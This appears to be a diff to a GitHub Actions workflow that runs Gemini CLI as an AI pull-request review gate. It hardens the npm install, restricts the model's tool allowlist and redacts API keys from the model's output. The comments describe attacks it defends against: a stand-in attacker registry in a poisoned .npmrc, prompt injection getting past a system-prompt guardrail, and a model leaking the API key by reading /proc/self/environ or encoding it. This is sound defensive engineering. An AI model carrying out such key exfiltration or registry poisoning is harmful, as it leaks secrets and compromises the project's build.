@@ -38,11 +38,23 @@ runs:
 
     - name: Install Gemini CLI (pinned)
       shell: bash
-      working-directory: ${{ inputs.working-directory }}
+      # SECURITY: Do NOT cd into `inputs.working-directory` (the PR-controlled
+      # `review/` checkout) for the install. `npm` reads `.npmrc` from cwd; a
+      # malicious PR could ship `.npmrc` with `registry=https://attacker.example/`
+      # and the install would pull a compromised package. The next step then
+      # runs `gemini` with GEMINI_API_KEY in env — the output sanitizer can't
+      # defend against a malicious binary (it can exfil over network or stderr).
+      # Install from $RUNNER_TEMP (no .npmrc), force per-user and global config
+      # to a forced-empty file, pin the registry explicitly.
       env:
         GEMINI_CLI_VERSION: ${{ inputs.gemini-cli-version }}
+        NPM_CONFIG_USERCONFIG: ${{ runner.temp }}/llm-gate-empty-npmrc
+        NPM_CONFIG_GLOBALCONFIG: ${{ runner.temp }}/llm-gate-empty-npmrc
+        NPM_CONFIG_REGISTRY: https://registry.npmjs.org/
       run: |
         set -euo pipefail
+        : > "$NPM_CONFIG_USERCONFIG"
+        cd "$RUNNER_TEMP"
         npm install --silent --no-audit --no-fund --global "@google/gemini-cli@${GEMINI_CLI_VERSION}"
         gemini --version
 
@@ -52,25 +64,46 @@ runs:
       run: |
         set -euo pipefail
         mkdir -p .gemini
+        # Gemini CLI v0.39.x expects nested `tools.core` and `model.maxSessionTurns`.
+        # Top-level `coreTools` / `maxSessionTurns` is silently ignored, which
+        # would leave the gate running with default (broader) tool access.
+        # See: https://github.com/google-gemini/gemini-cli/blob/v0.39.1/docs/reference/configuration.md
+        #
+        # The allowlist is intentionally broad so the model can deterministically
+        # verify lint/spec/check claims via `npm run *` rather than only
+        # describing what it sees. Residual risks (and their mitigations):
+        #   - `.npmrc` poisoning during install: mitigated in the install step
+        #     above by running from $RUNNER_TEMP with forced-empty npm config.
+        #   - PR-controlled `package.json` redefining `npm run X`: mitigated by
+        #     the system-prompt guardrail directing the model to read script
+        #     definitions before invoking and refuse modified scripts; bypassable
+        #     by adversarial prompt injection but acceptable given the same-repo
+        #     gate (only org members can trigger the workflow).
+        #   - API-key exfiltration via the model's `.justification`: mitigated
+        #     by the output sanitizer below.
         cat > .gemini/settings.json <<'JSON'
         {
-          "maxSessionTurns": 50,
-          "coreTools": [
-            "read_file",
-            "list_directory",
-            "glob",
-            "grep_search",
-            "run_shell_command(git diff)",
-            "run_shell_command(git log)",
-            "run_shell_command(git show)",
-            "run_shell_command(rg)",
-            "run_shell_command(cat)",
-            "run_shell_command(ls)",
-            "run_shell_command(wc)",
-            "run_shell_command(npm run validate)",
-            "run_shell_command(npm run lint)",
-            "run_shell_command(npm run check:)"
-          ]
+          "model": {
+            "maxSessionTurns": 50
+          },
+          "tools": {
+            "core": [
+              "read_file",
+              "list_directory",
+              "glob",
+              "grep_search",
+              "run_shell_command(git diff)",
+              "run_shell_command(git log)",
+              "run_shell_command(git show)",
+              "run_shell_command(rg)",
+              "run_shell_command(cat)",
+              "run_shell_command(ls)",
+              "run_shell_command(wc)",
+              "run_shell_command(npm run validate)",
+              "run_shell_command(npm run lint)",
+              "run_shell_command(npm run check:)"
+            ]
+          }
         }
         JSON
         python3 -m json.tool .gemini/settings.json >/dev/null
@@ -206,6 +239,32 @@ runs:
             } >> "$GITHUB_STEP_SUMMARY"
           fi
         fi
+
+        # Defense in depth: redact GEMINI_API_KEY from the model's justification
+        # before anything downstream sees it (artifact JSON, PR comment, step
+        # summary). The output contract restricts the model to {status,
+        # justification} where status is a closed enum, so justification is the
+        # only freeform exfil channel. Two redactions:
+        #   1. Literal $GEMINI_API_KEY value — catches the most direct leak
+        #      (model echoes the env var verbatim from cat /proc/self/environ
+        #      or similar).
+        #   2. AIza-pattern (Google API key shape) — catches accidental
+        #      occurrences of other Google API keys that happen to be in the
+        #      diff or model's context.
+        # Does NOT defeat encoded exfiltration (base64, rot13, splitting). For
+        # that threat model we rely on (a) the same-repo gate in the workflow's
+        # `if:` block which restricts triggers to org members, and (b) GitHub's
+        # reactive secret scanning + key revocation as the final backstop.
+        SANITIZED_JUSTIFICATION=$(printf '%s' "$PARSED" | jq -r '.justification' | python3 -c '
+        import sys, os, re
+        data = sys.stdin.read()
+        key = os.environ.get("GEMINI_API_KEY", "")
+        if key:
+            data = data.replace(key, "[REDACTED-GEMINI-API-KEY]")
+        data = re.sub(r"AIza[0-9A-Za-z_-]{35}", "[REDACTED-API-KEY-PATTERN]", data)
+        sys.stdout.write(data)
+        ')
+        PARSED=$(printf '%s' "$PARSED" | jq --arg j "$SANITIZED_JUSTIFICATION" '.justification = $j')
 
         # Char-count cost estimation. Token counts aren't exposed by the
         # CLI; we approximate at 4 chars/token (industry rule of thumb).
